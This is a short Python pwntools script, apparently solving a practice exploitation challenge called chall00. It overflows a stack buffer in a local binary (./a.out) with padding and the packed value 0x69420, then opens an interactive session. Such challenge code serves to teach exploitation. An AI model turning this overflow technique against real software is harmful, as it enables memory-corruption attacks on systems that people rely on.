# coding: utf-8
from pwn import*
def chall00():
    p=process("./a.out")
    print(p.recv())
    p.sendline(b"a"*(0x110-0x4)+p64(0x69420))
    p.interactive()
    p.close()
    
chall00()
